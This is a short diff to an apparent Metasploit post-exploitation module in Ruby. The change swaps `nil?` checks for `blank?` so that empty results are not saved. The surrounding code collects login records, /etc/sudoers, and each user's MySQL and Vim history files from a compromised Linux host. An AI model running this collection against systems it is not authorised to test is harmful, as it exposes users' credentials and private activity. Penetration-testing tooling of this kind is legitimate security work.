@@ -53,8 +53,8 @@ class Metasploit3 < Msf::Post
     last = execute("/usr/bin/last && /usr/bin/lastlog")
     sudoers = cat_file("/etc/sudoers")
 
-    save("Last logs", last) unless last.nil?
-    save("Sudoers", sudoers) unless sudoers.nil? || sudoers =~ /Permission denied/
+    save("Last logs", last) unless last.blank?
+    save("Sudoers", sudoers) unless sudoers.blank? || sudoers =~ /Permission denied/
   end
 
   def save(msg, data, ctype="text/plain")
@@ -121,13 +121,13 @@ class Metasploit3 < Msf::Post
           vprint_status("Extracting MySQL history for #{u}")
           sql_hist = cat_file("/home/#{u}/.mysql_history")
         end
-        save("MySQL History for #{u}", sql_hist) unless sql_hist.nil? || sql_hist =~ /No such file or directory/
+        save("MySQL History for #{u}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
       end
     else
       vprint_status("Extracting MySQL history for #{user}")
       sql_hist = cat_file("/home/#{user}/.mysql_history")
       vprint_status(sql_hist) if sql_hist
-      save("MySQL History for #{user}", sql_hist) unless sql_hist.nil? || sql_hist =~ /No such file or directory/
+      save("MySQL History for #{user}", sql_hist) unless sql_hist.blank? || sql_hist =~ /No such file or directory/
     end
   end
 
@@ -164,13 +164,13 @@ class Metasploit3 < Msf::Post
           vim_hist = cat_file("/home/#{u}/.viminfo")
         end
 
-        save("VIM History for #{u}", vim_hist) unless vim_hist.nil? || vim_hist =~ /No such file or directory/
+        save("VIM History for #{u}", vim_hist) unless vim_hist.blank? || vim_hist =~ /No such file or directory/
       end
     else
       vprint_status("Extracting history for #{user}")
       vim_hist = cat_file("/home/#{user}/.viminfo")
       vprint_status(vim_hist)
-      save("VIM History for #{user}", vim_hist) unless vim_hist.nil? || vim_hist =~ /No such file or directory/
+      save("VIM History for #{user}", vim_hist) unless vim_hist.blank? || vim_hist =~ /No such file or directory/
     end
   end
 end
